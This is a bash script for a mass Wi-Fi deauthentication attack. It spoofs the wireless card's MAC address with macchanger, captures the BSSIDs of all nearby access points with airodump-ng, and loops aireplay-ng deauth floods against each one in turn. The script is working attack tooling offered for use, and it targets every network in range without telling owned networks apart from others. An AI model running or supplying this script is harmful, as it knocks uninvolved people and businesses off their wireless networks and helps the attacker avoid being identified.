#!/bin/bash
#Creator: David Parra-Sandoval
#Date: 3/27/2020 
#Last Modified Date: 3/29/2020
clear
cd $HOME/Templates/Scripts/DeauthMultiCH
if [[ ${UID} -ne 0 ]]; then
echo "Please run as root or sudo"
exit 1
else echo "Welcome $USER"
echo "MassDeauth BSSID with auto Channel switching!"
sleep 3
fi

version1 () {
sed -i "s/sleep 1/sleep $COUNT/" CHv1.sh

exec xterm -iconic -e sudo airodump-ng --output-format kismet -w $KISMET $wlan0 &
echo "Capturing BSSID's and Associated Channels nearby......"
sleep 6
kill $!

sudo xterm -iconic -e ./CHv1.sh &
}

version2 () {
sed -i "s/sleep 1/sleep $COUNT/" CHv2.sh

exec xterm -iconic -e sudo airodump-ng --output-format kismet -w $KISMET $wlan0 &
echo "Capturing BSSID's and Associated Channels nearby......"
sleep 6
kill $!

sudo xterm -iconic -e ./CHv2.sh &
}

wifi=`ip a | grep wl | head -1 | cut -d ":" -f 2`
sudo airmon-ng start $wifi 2>&1 > /dev/null
clear
wlan0=`ip a | grep wl | head -1 | cut -d ":" -f 2`
sudo ip link set $wlan0 down && sudo macchanger -A $wlan0 && sudo ip link set $wlan0 up 2>&1 > /dev/null
clear

read -p "Name the kismet.csv:" KISMET
read -p "Deauth Count:" COUNT
read -p "Channel Version to use?: 1).CHv1, 2).CHv2 #:" VERSION
case $VERSION in
1) version1;;
2) version2;;
esac

sleep .5

for MAC in `cat $KISMET*.kismet.csv | awk -F ";" '{print $4}' | tail +2`; do
sudo aireplay-ng --deauth $COUNT -a $MAC $wlan0
done

rm *.kismet.csv

sudo airmon-ng stop $wlan0 2>&1 > /dev/null
sudo ip link set $wifi down && sudo ip link set $wifi up 2>&1 > /dev/null
killall xterm
sed -i "s/sleep $COUNT/sleep 1/" CHv1.sh
sed -i "s/sleep $COUNT/sleep 1/" CHv2.sh
clear
exit 0
